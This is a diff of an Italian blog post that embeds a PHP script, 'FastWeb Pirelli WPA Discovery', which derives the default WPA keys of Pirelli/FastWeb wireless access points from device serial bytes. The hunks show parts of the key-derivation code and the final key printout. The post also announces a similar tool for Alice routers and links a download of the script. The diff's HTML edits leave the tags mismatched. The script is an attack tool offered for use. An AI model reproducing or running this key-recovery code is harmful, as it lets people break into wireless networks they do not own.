@@ -36,9 +36,7 @@ Attualmente è possibile recuperare la chiave Wireless degli Access Point <stro
 00:21:96 Telsey S.p.A.</em><em> (in fase di Test)</em></blockquote>
 Detto questo, a breve pubblicherò uno script analogo ma per i router Alice, dato che stanno uscendo lavori anche in questo senso ;)
 
-<pre>
-  <code>
-  &lt;?php
+<pre><pre><code>  <?php
 /***************************************************************************
  *   FastWeb Pirelli WPA Discovery                                         *
  *   by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net      *
@@ -82,7 +80,7 @@ $sn_bytes = $sn_bytes[0];
  * Inizializzo una stringa con il valore intero di questi byte.
  */
 $str = "";
-for( $i = 0; $i &lt; 6; $i++ ){
+for( $i = 0; $i < 6; $i++ ){
     $str .= chr( hexdec( $sn_bytes[$i] ) );
 }
 echo "$str\n";
@@ -109,9 +107,9 @@ foreach( $md5_bytes as $byte ){
  * di un gruppo sia maggiore di 0x0a, aggiungo 0x57.
  */
 $hex_5 = array();
-for( $i = 0; $i &lt; 25; $i += 5 ){
+for( $i = 0; $i < 25; $i += 5 ){
     $n       = bindec( substr( $long, $i, 5 ) );
-    $hex_5[] = $n &gt; 0x0a ? $n + 0x57 : $n;
+    $hex_5[] = $n > 0x0a ? $n + 0x57 : $n;
 }
 /*
  * Compongo la chiave.
@@ -123,8 +121,6 @@ foreach( $hex_5 as $hex ){
 
 print "WPA : $wpa\n";
 
-?&gt;
-  </code>
-</pre>
+?></pre></code></pre>
 
 <strong><a href="http://sharecash.org/download.php?file=1279027" target="_blank">SCARICA SCRIPT</a></strong>
